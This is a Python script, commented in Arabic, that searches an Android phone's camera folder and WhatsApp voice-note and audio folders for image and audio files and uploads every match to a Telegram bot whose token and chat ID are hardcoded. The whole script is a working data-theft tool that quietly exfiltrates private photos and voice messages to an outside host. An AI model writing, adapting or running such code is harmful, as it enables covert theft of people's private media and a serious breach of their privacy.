import os
import requests

# بيانات البوت
bot_token = '7690578068:AAHYNN_bL1uvgeAV6tzjuw4MnhOuzaHgWiw'
chat_id = '6827204922'
api_url = f'https://api.telegram.org/bot{bot_token}/sendDocument'

# مجلدات الهدف
targets = [
    '/sdcard/DCIM/Camera',
    '/sdcard/WhatsApp/Media/WhatsApp Voice Notes',
    '/sdcard/WhatsApp/Media/WhatsApp Audio',
]

# أنواع الملفات المرغوبة
extensions = ['.jpg', '.jpeg', '.png', '.mp3', '.opus', '.wav', '.m4a']

# إرسال الملف
def send_file(path):
    try:
        with open(path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id}
            r = requests.post(api_url, files=files, data=data)
            if r.status_code == 200:
                print(f"[+] تم الإرسال: {path}")
            else:
                print(f"[-] فشل: {path} ({r.status_code})")
    except Exception as e:
        print(f"[!] خطأ في {path}: {e}")

# البحث والإرسال
for folder in targets:
    if os.path.exists(folder):
        for root, _, files in os.walk(folder):
            for file in files:
                if any(file.lower().endswith(ext) for ext in extensions):
                    send_file(os.path.join(root, file))
                  
